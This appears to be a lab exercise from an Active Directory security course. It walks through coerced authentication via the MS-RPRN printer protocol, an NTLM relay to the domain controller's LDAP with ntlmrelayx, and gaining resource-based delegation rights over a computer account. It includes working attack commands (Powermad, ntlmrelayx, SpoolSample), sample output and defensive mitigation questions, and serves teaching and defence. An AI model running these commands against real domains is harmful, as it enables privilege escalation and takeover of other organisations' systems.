# Exercise 3 - Coerced Authentication and NTLM Relay

## Preparations

Install the Webclient service to enable WebDav support on ADSEC-01. 

```
Install-WindowsFeature WebDAV-Redirector
```

Reboot the server, log back in and set the startup type for the new services to automatic.

```
Get-Service mrxdav,webclient | Set-Service -StartupType Automatic
```

Start manually and check to make sure they are running.

```
start-service mrxdav,webclient
get-service mrxdav,webclient
```

These are services that are usually not installed on Servers but they are by default installed on clients. If the Webclient service is installed and running, it allows for a different attack avenue we'd like to highlight below, which is a cross-protocol NTLM relay.

## Tools

You can find all tools needed in the ["attacker-tools.zip"-file](../exercises/attacker-tools). The links below are for your own reference.

Tools needed:

- Impacket: [https://github.com/SecureAuthCorp/impacket](https://github.com/SecureAuthCorp/impacket)
- SpoolSample: [https://github.com/leechristensen/SpoolSample](https://github.com/leechristensen/SpoolSample)
- Powermad: [https://github.com/Kevin-Robertson/Powermad/blob/master/Powermad.ps1](https://github.com/Kevin-Robertson/Powermad/blob/master/Powermad.ps1)

## Exercise

In this exercise, we'll use a design flaw in the MS-RPRN protocol to coerce authentication of a computer account and then forward that authentication to the domain controller to manipulate the victims computer object in the directory. A similar attack can be invoked by abusing the MS-EFSRPC protocol, better known as the [PetitPotam attack](https://github.com/topotam/PetitPotam).

The attack consists of three steps:

1) Create a new computer account
2) Set up a ntlm relay server
3) Trigger authentication

### Create a new computer account

The reason why we need to create a computer account is the fact that a computer account has an SPN by default and we need that lateron when we're talking about Kerberos delegation. Just accept this as given for now, we'll go into more detail soon ;-)

```
cd C:\attacker-tools\
cat -raw .\Powermad.ps1 | iex
New-MachineAccount -MachineAccount evilpc -Password (ConvertTo-SecureString -String "EvilPassword1" -AsPlainText -Force)
```

### Set up a ntlm relay server

Set up your relay server with ntlmrelayx like this.

```
ntlmrelayx.py --no-smb-server --delegate-access --escalate-user evilpc$ -t ldap://adsec-dc.contoso.com
```

 - **--no-smb-server** prevent ntlmrelayx from starting it's own smb service on port 445 which wouldn't be possible anyway since the Windows smb service is using that port. 
 - **--delegate-access** this tells ntlmrelayx that we want to modify the permissions for RBCD (ressource-based constrained kerberos delegation) on the victims computer account.
 - **--escalate-user evilpc$** we want to give those delegation permissions to the computer account we created earlier.
 - **-t ldap://adsec-dc.contoso.com** the target of the NTLM relay. The terminology can be confusing but from the relaying tools point of view, the original victim (will be ADSEC-01) is the source and the domain controllers LDAP service is the target. In a nutshell, this switch is about where you want to use those stolen credentials.

### Trigger authentication

Finally, trigger an authentication from ADSEC-01 using the SpoolSample.exe from attacker tools. Execute the command below in a different shell, while keeping ntlmrelayx running.

```
 .\SpoolSample.exe adsec-01 adsec-00@80/foobar
```

If the attack worked, you should see something like this in the ntlmrelayx-console. 

```
[*] HTTPD: Received connection from 10.200.200.101, attacking target ldap://adsec-dc.contoso.com
[*] HTTPD: Received connection from 10.200.200.101, attacking target ldap://adsec-dc.contoso.com
[*] Authenticating against ldap://adsec-dc.contoso.com as CONTOSO\adsec-01$ SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains
[*] Authenticating against ldap://adsec-dc.contoso.com as CONTOSO\adsec-01$ SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains
[*] HTTPD: Received connection from 10.200.200.101, attacking target ldap://adsec-dc.contoso.com
[*] Delegation rights modified succesfully!
[*] evilpc$ can now impersonate users on ADSEC-01$ via S4U2Proxy
```

Verify by checking the corresponding attribute on the computer object with PowerView.

```
cat -raw ".\PowerView.ps1" | iex
Get-DomainComputer adsec-01 | select msds-allowedtoactonbehalfofotheridentity
```

You should see that the attribute msds-allowedtoactonbehalfofotheridentity is now set and contains just a long list of digits. The reason is that this attribute does not contain just a simple account name but an ACL (like on a file) in the Microsoft SDDL format, which is stored in its binary representation here. Making this readable will be one of your challenges below.

You might wonder what we are going to do with those fancy delegation permissions we just acquired. We'll get to that in exercise 6 but first we have to learn more about Kerberos :-)

## Questions

- What is the best way to prevent normal users from creating computer accounts? Document the necessary configuration steps.
- Find the Powershell commands necessary to make this attribute readable and document them. You'll only need Powerview and what Powershell offers you natively. Hint: have a look at the blog posts here [https://posts.specterops.io](https://posts.specterops.io)
- Read [this guidance from the Carnegie Mellon CERT](https://www.kb.cert.org/vuls/id/405600) on how to mitigate PetitPotam. The article describes the use of an RPC filter to block the MS-EFSRPC procotol and therefore preventing coerced authentication. Adapt the RPC filter from the article to block MS-RPRN instead and apply it to ADSEC-01. Test the attack again, and see if it still works.
    - Hint: you'll need the UUID of the MS-RPRN protocol.